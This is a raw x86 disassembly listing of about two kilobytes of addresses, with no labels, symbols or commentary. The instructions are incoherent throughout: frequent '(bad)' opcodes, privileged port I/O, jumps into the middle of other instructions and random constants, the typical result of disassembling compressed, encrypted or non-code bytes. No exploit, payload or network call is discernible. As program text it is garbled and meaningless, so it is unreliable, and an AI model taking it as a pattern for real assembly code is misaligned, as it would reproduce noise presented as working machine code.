  4743fc:	fs jmp 0x47442e
  4743ff:	jne    0x474393
  474401:	mov    ?,esi
  474403:	add    DWORD PTR [eax+0x28],edx
  474406:	xor    BYTE PTR [ebp+0x3ef30b2d],al
  47440c:	ja     0x47448c
  47440e:	sbb    BYTE PTR [esi],dl
  474410:	inc    ebx
  474411:	daa    
  474412:	or     DWORD PTR [eax+eax*4-0x3778b3c3],ebp
  474419:	adc    eax,0xb35111a6
  47441e:	aaa    
  47441f:	mov    al,0x1b
  474421:	ret    0xe95c
  474424:	cmp    DWORD PTR [eax-0x750c64fa],ebp
  47442a:	add    BYTE PTR [edx+0x35],bh
  47442d:	mov    cl,BYTE PTR [edi+0x23]
  474430:	adc    ch,cl
  474432:	out    0x9f,al
  474434:	push   esi
  474435:	fmul   st,st(5)
  474437:	bound  si,DWORD PTR [ebp+0x9]
  47443b:	cmp    BYTE PTR [eax+eiz*1+0x75],0xea
  474440:	shl    DWORD PTR [esi-0x5f],0x62
  474444:	fidivr DWORD PTR [ecx]
  474446:	push   esp
  474447:	add    ah,bl
  474449:	xchg   DWORD PTR [esi-0x2446a8a1],esi
  47444f:	add    ebx,ecx
  474451:	fsubr  QWORD PTR [edi]
  474453:	add    edx,edx
  474455:	mov    ah,0xbf
  474457:	fbstp  TBYTE PTR [edx+ebp*1+0x52]
  47445b:	fcomp  DWORD PTR [eax+ecx*2-0x2724ff68]
  474462:	das    
  474463:	xor    eax,DWORD PTR [edi+eax*1+0x62d66078]
  47446a:	jl     0x47445e
  47446c:	push   ebp
  47446d:	out    dx,al
  47446e:	dec    ebx
  47446f:	iret   
  474470:	and    DWORD PTR [edx-0x3b],eax
  474473:	mov    eax,edi
  474475:	add    dh,bh
  474477:	adc    DWORD PTR [edx+0xc31d8af],0x4bac858
  474481:	jno    0x474446
  474483:	jge    0x4744a6
  474485:	jb     0x4744ac
  474487:	(bad)  
  474488:	gs loopne 0x4744ef
  47448b:	add    eax,DWORD PTR [eax+ebx*1-0x7bc0ff7c]
  474492:	sbb    dh,BYTE PTR [eax+0x2f]
  474495:	or     ebx,DWORD PTR [ebp+0x6affcf83]
  47449b:	or     eax,0xcaf0b0b
  4744a0:	dec    edi
  4744a1:	fstp   QWORD PTR [edx-0x4b5244da]
  4744a7:	mov    bh,0x12
  4744a9:	and    al,0xb9
  4744ab:	cwde   
  4744ac:	mov    cl,0x40
  4744ae:	and    ebp,esi
  4744b0:	(bad)  
  4744b1:	jmp    0x4744c1
  4744b3:	in     al,0x48
  4744b5:	mov    edx,0xa49c512a
  4744ba:	add    eax,0x31361da0
  4744bf:	out    0x0,al
  4744c1:	test   edi,edi
  4744c3:	push   0x8a16c55a
  4744c8:	and    eax,0x50cc175c
  4744cd:	push   esi
  4744ce:	pop    ds
  4744cf:	ins    DWORD PTR es:[edi],dx
  4744d0:	inc    esi
  4744d1:	pop    edi
  4744d2:	and    eax,DWORD PTR [edi+0x45]
  4744d5:	add    DWORD PTR [ecx],edi
  4744d7:	aaa    
  4744d8:	xor    esi,DWORD PTR [edx]
  4744da:	imul   esi,DWORD PTR [esi+eax*1],0xd
  4744de:	or     BYTE PTR [edx],cl
  4744e0:	retf   0xd8a
  4744e3:	xchg   esp,eax
  4744e4:	and    bl,al
  4744e6:	fisub  WORD PTR [ecx]
  4744e8:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4744ea:	je     0x47446f
  4744ec:	or     dh,BYTE PTR [edx]
  4744ee:	enter  0x7b00,0x3
  4744f2:	add    DWORD PTR [ecx+0x47],ebx
  4744f5:	or     al,0x39
  4744f7:	nop
  4744f8:	xchg   ecx,eax
  4744f9:	pop    es
  4744fa:	(bad)  
  4744fb:	add    BYTE PTR [edi+0x40e0ea1a],al
  474501:	push   es
  474502:	push   cs
  474503:	test   eax,0x6203c285
  474508:	xor    al,bh
  47450a:	xor    esp,DWORD PTR [esi+eiz*2]
  47450d:	sbb    al,0xf9
  47450f:	fcmovnbe st,st(0)
  474511:	stos   DWORD PTR es:[edi],eax
  474512:	je     0x47455a
  474514:	(bad)  
  474516:	ja     0x474556
  474518:	jne    0x474521
  47451a:	xor    eax,0xf3a7b86
  47451f:	add    al,0x1
  474521:	sbb    al,0x7b
  474523:	dec    edi
  474524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  474525:	pop    ebx
  474526:	mov    edi,0x9e500a74
  47452b:	add    al,0x10
  47452d:	push   cs
  47452e:	and    esp,eax
  474530:	add    eax,0x56790c3c
  474535:	pop    ss
  474536:	push   0x35
  474538:	mov    BYTE PTR [ecx+0xf],dh
  47453b:	inc    ecx
  47453c:	mov    esp,DWORD PTR [edi-0x68]
  47453f:	adc    BYTE PTR [edx+0x17],ah
  474542:	push   eax
  474543:	push   ebx
  474544:	loopne 0x47450c
  474546:	loopne 0x474578
  474548:	sbb    BYTE PTR [ebp-0x79c5275f],al
  47454e:	cld    
  47454f:	xor    al,0x17
  474551:	and    al,0x8
  474553:	or     al,0x8
  474555:	mov    eax,ds:0x35860c9c
  47455a:	add    BYTE PTR [edi],ch
  47455c:	adc    BYTE PTR [esi-0x77fc2411],dl
  474562:	mov    DWORD PTR [edx-0x5e843105],edi
  474568:	(bad)  
  474569:	faddp  st(1),st
  47456b:	pushf  
  47456c:	ins    BYTE PTR es:[edi],dx
  47456d:	xchg   edx,eax
  47456e:	or     al,0x15
  474570:	cli    
  474571:	cmp    BYTE PTR [esp+ebp*8-0x68],bh
  474575:	dec    eax
  474576:	gs jge 0x474580
  474579:	iret   
  47457a:	add    al,0x72
  47457c:	dec    edx
  47457d:	push   cs
  47457e:	mov    ds:0x2970a040,al
  474583:	cmp    DWORD PTR [edx],eax
  474585:	cmp    DWORD PTR [edi-0x4e185750],ebx
  47458b:	xor    DWORD PTR [edx+0x9e82f04],edx
  474591:	test   BYTE PTR [edx],al
  474593:	(bad)  [ebx+0xdfed901]
  474599:	push   edx
  47459a:	jo     0x474590
  47459c:	cmc    
  47459d:	adc    al,0x39
  47459f:	rol    dh,0x1d
  4745a2:	sbb    ecx,DWORD PTR [esi+ebx*8-0x14]
  4745a6:	adc    eax,0x10381ef1
  4745ab:	sub    esi,DWORD PTR [ebp+0xd]
  4745ae:	pop    ebx
  4745af:	ret    0xae0
  4745b2:	jmp    0x474574
  4745b4:	mov    dh,0x30
  4745b6:	jle    0x47456c
  4745b8:	mov    al,0x27
  4745ba:	fnsave [eax+ebx*8+0x1d]
  4745be:	xor    al,0xb3
  4745c0:	das    
  4745c1:	jb     0x4745d0
  4745c3:	(bad)
  4745c6:	jmp    0x4745e5
  4745c8:	fsubr  QWORD PTR [edx-0x1464e023]
  4745ce:	or     ebx,DWORD PTR [ecx]
  4745d0:	fs dec ecx
  4745d2:	les    ecx,FWORD PTR [ebx-0xae75d9d]
  4745d8:	push   ds
  4745d9:	add    esp,0xf46060c1
  4745df:	add    eax,0x671244da
  4745e4:	mov    esi,0x52ac34b4
  4745e9:	push   ss
  4745ea:	sti    
  4745eb:	xor    ah,BYTE PTR [eax-0x247fe15]
  4745f1:	jg     0x4745f7
  4745f3:	add    BYTE PTR [esi],cl
  4745f5:	mov    dl,BYTE PTR [esp+eax*1-0x1]
  4745f9:	sub    dl,0x21
  4745fc:	jb     0x4745f0
  4745fe:	or     BYTE PTR ds:0xcb80ed74,cl
  474604:	dec    esp
  474605:	cmp    al,0xc
  474607:	retf   
  474608:	xchg   ecx,eax
  474609:	add    esi,DWORD PTR [ecx+0x6d]
  47460c:	popa   
  47460d:	xchg   DWORD PTR fs:[edi],ecx
  474610:	fwait
  474611:	inc    ecx
  474612:	pop    ebp
  474613:	or     dh,bl
  474615:	sbb    al,0x94
  474617:	fwait
  474618:	mov    eax,ds:0x1865238d
  47461d:	mov    ss,WORD PTR [edx]
  47461f:	mov    al,ds:0xaab109f0
  474624:	out    dx,eax
  474625:	jg     0x474678
  474627:	push   eax
  474628:	lods   eax,DWORD PTR ds:[esi]
  474629:	xor    edi,DWORD PTR [eax*2-0x73f507cd]
  474630:	xor    eax,0xd9ce0702
  474635:	(bad)  
  474636:	xor    BYTE PTR [ebx+0x6e],dl
  474639:	clc    
  47463a:	push   0x2
  47463c:	push   ds
  47463d:	add    DWORD PTR ds:0x5c184254,0x9a99fed4
  474647:	mov    DWORD PTR [ebx],ebx
  474649:	adc    al,0x77
  47464b:	call   0x7e5e574c
  474650:	push   es
  474651:	adc    eax,0xa3a5e44c
  474656:	cmp    BYTE PTR [edx-0x7b],0x67
  47465a:	add    eax,DWORD PTR [edi]
  47465c:	dec    esp
  47465d:	call   0x86024d1a
  474662:	lods   eax,DWORD PTR ds:[esi]
  474663:	pop    ss
  474664:	dec    edi
  474665:	jo     0x4746b2
  474667:	pop    edi
  474668:	leave  
  474669:	sub    ebx,esp
  47466b:	imul   ecx,DWORD PTR [ecx+edx*2+0x1],0xffffff84
  474670:	inc    di
  474672:	mov    ch,0x69
  474674:	cwde   
  474675:	pusha  
  474676:	lods   eax,DWORD PTR ds:[esi]
  474677:	pop    ebx
  474678:	pusha  
  474679:	loop   0x4746f2
  47467b:	sub    ebp,ebp
  47467d:	in     eax,0xbe
  47467f:	test   al,0xd2
  474681:	fmul   DWORD PTR [eax]
  474683:	push   ebp
  474684:	push   0xb
  474686:	sti    
  474687:	(bad)  
  474689:	imul   edx,DWORD PTR [edx-0x2ce37747],0x4a
  474690:	lea    eax,[ebx+0x44]
  474693:	dec    eax
  474694:	retf   
  474695:	jnp    0x4746c4
  474697:	cmp    BYTE PTR [esp+esi*8-0x71819a7],dh
  47469e:	inc    ebp
  47469f:	ds fs nop
  4746a2:	out    0xf0,al
  4746a4:	mov    eax,0xc78bf038
  4746a9:	inc    ebx
  4746aa:	mov    eax,0xca435c08
  4746af:	pusha  
  4746b0:	mov    al,ds:0xfbf673dd
  4746b5:	or     eax,0x8c1ae75
  4746ba:	xchg   DWORD PTR [eax+ecx*1],esp
  4746bd:	pop    esp
  4746be:	add    eax,0x2ef79a69
  4746c3:	vpshld ymm0,[esi],xmm5
  4746c8:	in     al,dx
  4746c9:	call   0x10f98454
  4746ce:	xchg   esi,eax
  4746cf:	shl    BYTE PTR [ecx],0xe1
  4746d2:	in     al,dx
  4746d3:	fwait
  4746d4:	fs repz dec ebp
  4746d7:	dec    ecx
  4746d8:	call   0xe571a8e1
  4746dd:	sub    al,dh
  4746df:	nop
  4746e0:	or     al,0xe8
  4746e2:	or     BYTE PTR [ebp-0x64],dh
  4746e5:	ja     0x4746e7
  4746e7:	aaa    
  4746e8:	mov    esi,0x3eb54e73
  4746ed:	test   eax,0x78d9f9f6
  4746f2:	and    DWORD PTR [ecx+0x6ff633a7],eax
  4746f8:	test   ch,ch
  4746fa:	div    bl
  4746fc:	push   es
  4746fd:	jl     0x474706
  4746ff:	je     0x474720
  474701:	xchg   esp,eax
  474702:	cmp    al,0x9d
  474704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  474705:	jne    0x4746f7
  474707:	lea    eax,[esp+esi*4]
  47470a:	add    ah,cl
  47470c:	js     0x474721
  47470e:	outs   dx,BYTE PTR ds:[esi]
  47470f:	cmp    DWORD PTR [esi+0x43b0a400],0xd887783b
  474719:	nop
  47471a:	push   cs
  47471b:	cmp    edi,ebx
  47471d:	mov    cl,0xf9
  47471f:	xchg   edi,eax
  474720:	sub    eax,0x2c3953ce
  474725:	push   0x7a1446ff
  47472a:	arpl   WORD PTR [ecx+0x747d5c8f],si
  474730:	or     BYTE PTR [eax+0x3d5c54f7],al
  474736:	mov    cl,0xfd
  474738:	and    eax,0xb6007246
  47473e:	jmp    0x47478f
  474740:	inc    ebp
  474741:	add    BYTE PTR [esi+0x6f],bh
  474744:	out    dx,eax
  474745:	in     eax,dx
  474746:	mov    ds:0x4f80c5b6,eax
  47474b:	icebp  
  47474c:	sub    BYTE PTR [ebx],al
  47474e:	pop    eax
  47474f:	cs es mov edx,0x7dd0ad0b
  474756:	mov    eax,0x55d43d88
  47475b:	or     BYTE PTR [ebx],bl
  47475d:	inc    esi
  47475e:	xchg   dl,bl
  474760:	fidiv  DWORD PTR [esi-0x3]
  474763:	add    DWORD PTR [ebx-0x15c87fd1],0x3c
  47476a:	push   0x4
  47476c:	push   esi
  47476d:	arpl   WORD PTR [eax+0x58],bp
  474770:	jbe    0x4747ae
  474772:	mov    ds:0x900f4ec5,al
  474777:	mov    edx,0xc792b831
  47477c:	in     al,dx
  47477d:	stos   DWORD PTR es:[edi],eax
  47477e:	test   BYTE PTR [ebx],al
  474780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  474781:	mov    cl,BYTE PTR [edx+0x75]
  474784:	hlt    
  474785:	push   0x3
  474787:	push   ecx
  474788:	xchg   edx,eax
  474789:	and    ecx,DWORD PTR [eax]
  47478b:	xor    dl,BYTE PTR [ebx+edx*2-0x2bcbdc56]
  474792:	mov    eax,0xc8b7785e
  474797:	mov    al,ds:0xf319914
  47479c:	sub    eax,DWORD PTR [ebx]
  47479e:	cmovno esi,DWORD PTR [esi]
  4747a1:	jne    0x474729
  4747a3:	mov    eax,0x4149e75f
  4747a8:	dec    edx
  4747a9:	test   DWORD PTR [eax+edi*8-0x6fb04764],ecx
  4747b0:	fs xchg edx,eax
  4747b2:	or     eax,edi
  4747b4:	test   DWORD PTR [edi],ecx
  4747b6:	add    BYTE PTR [edx+ebx*2+0x6d],0xaa
  4747bb:	add    BYTE PTR [ecx],0x87
  4747be:	or     al,0x2a
  4747c0:	repz mov WORD PTR [edi+0x2d],?
  4747c4:	ror    BYTE PTR [esi],0x79
  4747c7:	mov    dl,0x35
  4747c9:	jmp    0x4747ee
  4747cb:	mov    ah,BYTE PTR [esi+0x7eabfd1a]
  4747d1:	sub    al,0x47
  4747d3:	je     0x4747ef
  4747d5:	sub    al,0x20
  4747d7:	je     0x4747ef
  4747d9:	scas   al,BYTE PTR es:[edi]
  4747da:	ret    0xf41c
  4747dd:	inc    eax
  4747de:	mov    ds:0x9a8c0116,eax
  4747e3:	and    DWORD PTR [ecx+ebx*8+0x6f],ebp
  4747e7:	loopne 0x474811
  4747e9:	cmp    DWORD PTR [esi+0x3e],edi
  4747ec:	test   al,0x67
  4747ee:	sbb    DWORD PTR cs:[edx],0xfffffff7
  4747f2:	push   esi
  4747f3:	push   edi
  4747f4:	sbb    eax,DWORD PTR [eax-0x3b0bbb17]
  4747fa:	in     eax,0x2e
  4747fc:	mov    edx,ebx
  4747fe:	push   eax
  4747ff:	fcomi  st,st(0)
  474801:	imul   DWORD PTR [ebp-0x48]
  474804:	jo     0x4747d7
  474806:	mov    bh,0xf0
  474808:	lods   eax,DWORD PTR ds:[esi]
  474809:	add    ebx,DWORD PTR [ebp-0x4]
  47480c:	jg     0x4747af
  47480e:	into   
  47480f:	ja     0x474881
  474811:	pop    eax
  474812:	mov    edx,0x888d8ca0
  474817:	mov    ecx,0x13ec0502
  47481c:	fdiv   QWORD PTR [esi+0xf]
  47481f:	dec    edx
  474820:	mov    edx,0xeb0330ac
  474825:	jle    0x4747e1
  474827:	mov    al,0x4b
  474829:	pslld  mm3,QWORD PTR [edx+esi*1+0x4]
  47482e:	adc    eax,eax
  474830:	add    ebx,0x3
  474833:	pusha  
  474834:	xchg   edx,eax
  474835:	and    esi,esi
  474837:	jmp    0x47488f
  474839:	mov    edx,0x30d49bc8
  47483e:	xor    al,cl
  474840:	(bad)  
  474842:	jmp    0x754bbca0
  474847:	push   cs
  474848:	xor    al,0xe0
  47484a:	jmp    0x47482c
  47484c:	xchg   ecx,eax
  47484d:	pop    esp
  47484e:	repnz add al,0xec
  474851:	in     al,dx
  474852:	jle    0x60a9593f
  474858:	fdivr  st(5),st
  47485a:	lea    edi,[eax-0x6dcef768]
  474860:	in     al,dx
  474861:	out    dx,eax
  474862:	xor    DWORD PTR [eax+0xf10910b],edi
  474868:	mul    DWORD PTR [edi+0x18]
  47486b:	ja     0x474882
  47486d:	mov    al,0xa
  47486f:	daa    
  474870:	inc    edi
  474871:	gs add dl,al
  474874:	ins    DWORD PTR es:[edi],dx
  474875:	xor    BYTE PTR [ebx+0x1f],0x2b
  474879:	pop    edi
  47487a:	and    esp,DWORD PTR [esi+edi*4]
  47487d:	mov    WORD PTR ds:0xdd2daa77,?
  474883:	add    bh,BYTE PTR [esi-0x7900a9cf]
  474889:	sti    
  47488a:	cld    
  47488b:	iret   
  47488c:	imul   ebp,DWORD PTR [eax],0x858d1c1f
  474892:	int3   
  474893:	cld    
  474894:	(bad)  
  474895:	call   DWORD PTR [eax+0x56]
  474898:	pop    eax
  474899:	shr    dh,0xfe
  47489c:	pop    eax
  47489d:	cmp    DWORD PTR [ebp+0x755b18dc],0xb1b701c
  4748a7:	cwde   
  4748a8:	pop    ss
  4748a9:	jmp    0x400:0x49d085bb
  4748b0:	idiv   BYTE PTR [eax+edi*1+0x55]
  4748b4:	and    BYTE PTR [ebx],ah
  4748b6:	aaa    
  4748b7:	adc    al,0x3e
  4748b9:	enter  0xd58c,0x35
  4748bd:	out    0xa8,eax
  4748bf:	loopne 0x47485a
  4748c1:	dec    eax
  4748c2:	jo     0x4748b3
  4748c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4748c5:	jmp    0x4748d0
  4748c7:	sub    esi,DWORD PTR [ebp+0x84d6665]
  4748cd:	mov    ah,0xcd
  4748cf:	lds    esi,FWORD PTR [edx-0x2f4767a4]
  4748d5:	inc    edx
  4748d6:	push   ds
  4748d7:	out    dx,eax
  4748d8:	jecxz  0x474887
  4748da:	or     al,0x73
  4748dc:	add    BYTE PTR [ecx+eax*2],0xb8
  4748e0:	cmp    BYTE PTR [edx+0x702a9040],0x7b
  4748e7:	retf   0xf80f
  4748ea:	scas   al,BYTE PTR es:[edi]
  4748eb:	adc    eax,0x37c7c013
  4748f0:	cmp    BYTE PTR [eax],bh
  4748f2:	daa    
  4748f3:	enter  0x29e2,0xee
  4748f7:	xchg   edx,eax
  4748f8:	mov    al,0x90
  4748fa:	sbb    bh,BYTE PTR [ebp+0x5d]
  4748fd:	addr16 neg bh
  474900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  474901:	push   es
  474902:	test   eax,0x7c80fc12
  474907:	add    bh,bh
  474909:	cs je  0x474914
  47490c:	mov    eax,0x65467384
  474911:	add    dl,BYTE PTR [ebp-0x3a]
  474914:	sub    edi,esp
  474916:	pusha  
  474917:	daa    
  474918:	add    BYTE PTR [ebx+0x440fa17],0x3d
  47491f:	xchg   ecx,eax
  474920:	in     eax,dx
  474921:	and    DWORD PTR [edi-0x7277a4e1],eax
  474927:	xchg   ebp,eax
  474928:	add    DWORD PTR [ebx],esp
  47492a:	and    eax,0x69b9e080
  47492f:	popf   
  474930:	pop    eax
  474931:	sbb    DWORD PTR [ecx-0x7a3903f6],ecx
  474937:	test   al,0x4
  474939:	sub    dh,BYTE PTR [esi+ebp*1-0x11]
  47493d:	cmp    eax,0x92b0ac24
  474942:	hlt    
  474943:	imul   eax,DWORD PTR [ebx-0x4be12d19],0x3e0a05b8
  47494d:	mov    esp,0x72369729
  474952:	sar    al,0x1e
  474955:	(bad)  
  474956:	enter  0x61d,0xad
  47495a:	shr    DWORD PTR [edx-0x726995fb],0x17
  474961:	sub    BYTE PTR [eax],cl
  474963:	mov    eax,0x7f2f7824
  474968:	ror    BYTE PTR ds:0x53a1357a,0x71
  47496f:	pop    ebp
  474970:	add    DWORD PTR [esi],ebp
  474972:	push   es
  474973:	sub    BYTE PTR [eax+edi*4-0x6af3eabd],bh
  47497a:	pop    eax
  47497b:	dec    eax
  47497c:	mov    esp,ebp
  47497e:	mov    eax,ds:0x94ff0094
  474983:	dec    edx
  474984:	inc    ax
  474986:	pop    esi
  474987:	mov    eax,ds:0xaf0870b8
  47498c:	or     BYTE PTR [edi+0x71],0x1a
  474990:	sbb    esi,DWORD PTR [eax-0x487c9c96]
  474996:	mov    al,0x44
  474998:	push   eax
  474999:	or     BYTE PTR [eax-0x61],cl
  47499c:	pop    eax
  47499d:	mov    BYTE PTR [ebx+0x5ef75a10],ah
  4749a3:	or     BYTE PTR [ecx+edi*4+0x13],cl
  4749a7:	push   eax
  4749a8:	div    ah
  4749aa:	loope  0x4749cd
  4749ac:	lahf   
  4749ad:	pop    ebp
  4749ae:	cld    
  4749af:	push   ebp
  4749b0:	inc    eax
  4749b1:	push   esi
  4749b2:	push   0x878bb4c
  4749b7:	aas    
  4749b8:	cwde   
  4749b9:	push   eax
  4749ba:	xor    eax,0x406a36eb
  4749bf:	sbb    al,0x9c
  4749c1:	cmp    al,BYTE PTR [ecx+0x70685e6c]
  4749c7:	push   0x4e825a10
  4749cc:	add    eax,0xc4c545f7
  4749d1:	sub    esp,DWORD PTR [eax+0x1b358462]
  4749d7:	add    DWORD PTR [eax+ebx*2+0xf],0xffffffd6
  4749dc:	inc    eax
  4749dd:	and    DWORD PTR [ecx],esp
  4749df:	aas    
  4749e0:	popf   
  4749e1:	stos   BYTE PTR es:[edi],al
  4749e2:	sbb    esp,DWORD PTR [eax]
  4749e4:	adc    eax,0x478d4a9e
  4749e9:	add    al,0xf9
  4749eb:	rol    BYTE PTR [eax+0x61],1
  4749ee:	sar    esp,0x84
  4749f1:	fcmovnb st,st(1)
  4749f3:	mov    al,0x14
  4749f5:	inc    ecx
  4749f6:	mov    al,0x28
  4749f8:	xchg   DWORD PTR [ecx+0x181792c0],eax
  4749fe:	es out 0xbb,al
  474a01:	jnp    0x4749ff
  474a03:	icebp  
  474a04:	dec    ebx
  474a05:	mov    ds:0x80db084d,al
  474a0a:	or     al,0xe
  474a0c:	les    eax,FWORD PTR [ecx-0x1a7f7cf9]
  474a12:	in     eax,dx
  474a13:	mov    ebx,0x54b11856
  474a18:	fsincos 
  474a1a:	mov    al,0xb0
  474a1c:	ss or  BYTE PTR cs:[edi+0x57],dh
  474a21:	bound  esp,QWORD PTR [edx]
  474a23:	dec    eax
  474a24:	adc    eax,0x7b77feac
  474a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  474a2a:	aam    0x80
  474a2c:	mov    esp,0x868dbcb4
  474a31:	test   eax,0xd1838223
  474a36:	ficom  DWORD PTR [ebp-0x46dcfb6f]
  474a3c:	(bad)  
  474a3d:	mov    ebx,0x9bf8d2bc
  474a42:	inc    edx
  474a43:	clc    
  474a44:	and    DWORD PTR [esi+0x4f],edx
  474a47:	cmp    BYTE PTR [eax+0xc],0xbc
  474a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  474a4c:	fistp  WORD PTR [edi+0x1b]
  474a4f:	and    eax,0x8aecc3e4
  474a54:	push   cs
  474a55:	or     DWORD PTR [ebp+eax*2+0x31],edx
  474a59:	push   edx
  474a5a:	lea    eax,[eax]
  474a5c:	jle    0x474a66
  474a5e:	fldenv [ecx]
  474a60:	jge    0x474a6e
  474a62:	and    cl,bh
  474a64:	xor    ebx,ebx
  474a66:	lock fild QWORD PTR [ebx+edx*2]
  474a6a:	mov    al,0x1c
  474a6c:	mov    eax,0x7f06fb83
  474a71:	or     DWORD PTR [ebx],edi
  474a73:	xor    al,0xdd
  474a75:	and    BYTE PTR [eax+0x3abb77ce],dl
  474a7b:	jne    0x474a6e
  474a7d:	sbb    edx,DWORD PTR ds:0x24dd0c8b
  474a83:	xor    al,0x48
  474a85:	scas   eax,DWORD PTR es:[edi]
  474a86:	in     al,dx
  474a87:	xor    bl,BYTE PTR [esp+esi*2-0x55]
  474a8b:	dec    esp
  474a8c:	jmp    0x474aab
  474a8e:	and    dh,al
  474a90:	mov    al,0x8b
  474a92:	mov    al,ds:0xce54e46b
  474a97:	or     eax,0xbe3d7064
  474a9c:	scas   eax,DWORD PTR es:[edi]
  474a9d:	lea    edi,[edi]
  474a9f:	lods   al,BYTE PTR ds:[esi]
  474aa0:	inc    esp
  474aa1:	mov    DWORD PTR [eax+0xc],esi
  474aa4:	pop    ecx
  474aa5:	aas    
  474aa6:	ins    BYTE PTR es:[edi],dx
  474aa7:	mov    ebp,0xe1540afe
  474aac:	sub    bh,al
  474aae:	xchg   edx,eax
  474aaf:	mov    DWORD PTR [ecx],eax
  474ab1:	push   ebx
  474ab2:	or     eax,edx
  474ab4:	(bad)  
  474ab5:	(bad)  
  474ab6:	push   eax
  474ab7:	sar    dh,1
  474ab9:	retf   0xc74
  474abc:	push   es
  474abd:	adc    BYTE PTR [edx-0x80],cl
  474ac0:	jmp    0x8b69:0x50127216
  474ac7:	mov    al,0x86
  474ac9:	adc    eax,0x2beb0a94
  474ace:	push   cs
  474acf:	cwde   
  474ad0:	and    esi,DWORD PTR [eax]
  474ad2:	test   al,0x14
  474ad4:	cmp    al,0x63
  474ad6:	jb     0x474b18
  474ad8:	or     ch,BYTE PTR [ebp+0x7]
  474adb:	mov    bh,0xb0
  474add:	mov    ss,esi
  474adf:	or     esi,DWORD PTR [edx-0x15]
  474ae2:	pop    es
  474ae3:	cmp    dl,BYTE PTR [edx-0x52ef0cca]
  474ae9:	add    al,0x8e
  474aeb:	ret    0x9be9
  474aee:	loopne 0x474b41
  474af0:	retf   
  474af1:	mov    edi,ss
  474af3:	loopne 0x474abf
  474af5:	cld    
  474af6:	nop
  474af7:	pop    ss
  474af8:	adc    dl,BYTE PTR [edx]
  474afa:	loope  0x474a94
  474afc:	js     0x474abc
  474afe:	or     BYTE PTR [ebx-0x701927fc],cl
  474b04:	push   edi
  474b05:	pushf  
  474b06:	push   esi
  474b07:	pop    eax
  474b08:	sub    eax,0xee6ca104
  474b0d:	cmp    edi,esp
  474b0f:	add    BYTE PTR [ebp-0xdf1bfae],cl
  474b15:	or     edi,DWORD PTR [edx-0x7552c998]
  474b1b:	in     al,dx
  474b1c:	or     al,0xf0
  474b1e:	jge    0x474b14
  474b20:	clc    
  474b21:	push   ds
  474b22:	in     al,0x3e
  474b24:	cmp    al,0xe4
  474b26:	jbe    0x474abe
  474b28:	push   esp
  474b29:	loopne 0x474acc
  474b2b:	int3   
  474b2c:	dec    ebp
  474b2d:	loopne 0x474b5f
  474b2f:	fs jnp 0x474b6b
  474b32:	inc    ebp
  474b33:	adc    al,0x46
  474b35:	mov    bl,dh
  474b37:	jg     0x474af7
  474b39:	mov    bl,0xae
  474b3b:	push   cs
  474b3c:	loope  0x474b1e
  474b3e:	in     eax,dx
  474b3f:	call   0xbc54fa61
  474b44:	and    dh,0x89
  474b47:	int3   
  474b48:	and    ch,BYTE PTR [ebp+0x0]
  474b4b:	bound  eax,QWORD PTR [ebx+0x77790704]
  474b51:	mov    ds:0x3e238dd8,eax
  474b56:	les    ebp,FWORD PTR [edx-0x26]
  474b59:	rol    DWORD PTR [ecx+eax*8],0xae
  474b5d:	test   BYTE PTR [edi],bh
  474b5f:	sub    ch,cl
  474b61:	dec    eax
  474b62:	ret    
  474b63:	into   
  474b64:	mov    ah,al
  474b66:	jnp    0x474ae9
  474b68:	jb     0x474b01
  474b6a:	test   BYTE PTR [esi+0x598b006a],dh
  474b70:	inc    ecx
  474b71:	(bad)  
  474b72:	in     eax,0x72
  474b74:	push   ebx
  474b75:	push   ebp
  474b76:	cmp    al,0x48
  474b78:	je     0x474bc2
  474b7a:	jmp    0x474bd1
  474b7c:	mov    ecx,0x33f93972
  474b81:	je     0x474bba
  474b83:	jmp    0x474bcc
  474b85:	xor    eax,0x2feb1628
  474b8a:	shl    DWORD PTR [edi+edi*8-0x14e2da8d],cl
  474b91:	and    DWORD PTR [eax+0x4b0c303],esi
  474b97:	add    al,0x5
  474b99:	push   es
  474b9a:	dec    ebp
  474b9b:	shl    DWORD PTR [ecx*2+0xb090807],cl
  474ba2:	or     al,0xd
  474ba4:	xchg   BYTE PTR [ecx],ah
  474ba6:	aam    0x34
  474ba8:	push   cs
  474ba9:	push   ss
  474baa:	ja     0x474bd4
  474bac:	and    ch,BYTE PTR [edi]
  474bae:	mov    dh,0x35
  474bb0:	scas   al,BYTE PTR es:[edi]
  474bb1:	enter  0x8b51,0x12
  474bb5:	push   ds
  474bb6:	shr    cl,0x1
  474bb9:	iret   
  474bba:	mov    WORD PTR [eax+edx*2+0x11e6972e],?
  474bc1:	or     dh,BYTE PTR [eax+0x359faca8]
  474bc7:	stc    
  474bc8:	add    DWORD PTR [ebx],ebx
  474bca:	daa    
  474bcb:	shr    DWORD PTR [edx+0x58],0xfc
  474bcf:	xor    ecx,ebx
  474bd1:	mov    ds:0x147b83e3,al
  474bd6:	cli    
  474bd7:	(bad)  
  474bd9:	pushf  
  474bda:	jae    0x474c1d
  474bdc:	add    DWORD PTR [edi+0x433c454c],0xd847ee18
  474be6:	test   BYTE PTR [edx],dl
  474be8:	mov    BYTE PTR [esi+edx*1-0x7d76aff4],al
  474bef:	fstp   DWORD PTR [edx]
  474bf1:	les    edi,FWORD PTR [ebp-0x14]
  474bf4:	dec    ecx
  474bf5:	test   DWORD PTR [esi+0x26127c23],esi
  474bfb:	push   ebx
  474bfc:	xlat   BYTE PTR ds:[ebx]
  474bfd:	mov    bh,0xe0
  474bff:	dec    edi
  474c00:	adc    eax,0x80a8f338
  474c05:	cdq    
  474c06:	fs mov al,0xfe
  474c09:	or     DWORD PTR [edi],edi
  474c0b:	push   0x1b8dfe2a
  474c10:	lea    edx,[ebp-0x624f9829]
  474c16:	cmp    al,0xc4
  474c18:	add    eax,0x206b2b8b
  474c1d:	cmp    al,0xdf
  474c1f:	add    eax,0x818bae4d
  474c24:	mov    esp,0x690bc073
  474c29:	and    ebx,DWORD PTR [edi+0xf]
  474c2c:	and    eax,0xf8c81fc4
  474c31:	mov    dl,0xcc
  474c33:	test   BYTE PTR [esi+ebx*8],al
  474c36:	jb     0x474c08
  474c38:	int    0x8c
  474c3a:	loope  0x474bca
  474c3c:	loopne 0x474c11
